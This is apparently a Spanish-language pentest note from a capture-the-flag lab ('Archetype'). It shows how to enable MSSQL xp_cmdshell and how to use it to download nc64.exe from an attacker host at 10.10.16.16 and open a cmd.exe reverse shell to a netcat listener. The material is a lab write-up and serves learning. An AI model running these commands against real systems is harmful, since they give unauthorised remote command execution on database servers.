[[MSSQL]] permite ejecutar comandos del sistema mediante funciones como `xp_cmdshell`.  
Esto permite interactuar con el sistema operativo directamente desde la base de datos.


----
# Como activarlo

[Cheatsheet de comandos mssql](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
Vamos a activar el xp_cmdshell por que por defecto viene desactivado

```mssql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Ahora hacemos la prueba con `xp_cmdshell "whoami"` para ver si da output
![[Archetype12.png]]
Y como podemos ver responde que somos archetype/sql_svc. Asi que ya confirmamos que esta activado el xp_cmdshell



---------


# Un uso que se le puede dar es para mandar una [[Reverse shell]] 
#### Para mandar la [[Reverse shell]] vamos a necesitar de [[Netcat]]

[Link de netcat para 64bits](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------) Vamos a levantar un server de [[python3 -m http.server]] desde nuestra maquina, para que por wget lo descargue la maquina victima. Y a posteriori vamos a ponernos en escucha con  [[rlwrap nc -lvnp 443]] para la reverseshell

```shell
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.16/nc64.exe -outfile nc64.exe           / Descargamos el archivo
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.16.16 443"                       / Mandamos la reverseshell
```

![[Archetype14.png]]
![[Archetype13.png]]

[[rlwrap nc -lvnp 443]]  Para estar en escucha

![[Imagenes/Archetype16.png]]